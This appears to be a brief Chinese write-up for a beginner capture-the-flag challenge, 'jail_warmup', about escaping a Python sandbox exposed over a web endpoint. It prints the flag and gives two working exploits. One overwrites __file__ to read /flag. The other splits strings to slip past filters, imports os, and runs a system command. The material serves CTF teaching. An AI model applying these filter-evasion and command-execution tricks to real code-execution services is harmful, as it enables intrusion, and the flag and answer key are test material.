- **题目名称：**jail_warmup

- **题目类型：** WEB

- **题目难度：**容易

- **出题人：**unknown

- **考点：**基础pyjail

- **描述：**基础pyjail

- **flag：**XSCTF{ez_pyjail_isn_t_it}

- **Writeup：** 

  直接修改_\_file__

  ```
  import requests
  url = 'http://127.0.0.1:11111'
  
  code2 = '''
  globals()['__file__'] = '/flag'
  '''
  
  res = requests.post(url=f'{url}/exec',data={'code':code2})
  res = requests.get(url=url)
  print(res.text)
  ```

  或者rce

  ```
  code = '''
  o = getattr(__builtins__,'__impo''rt__')('o''s')
  syst = getattr(o,'syst''em')
  syst('whoami')
  '''
  ```

  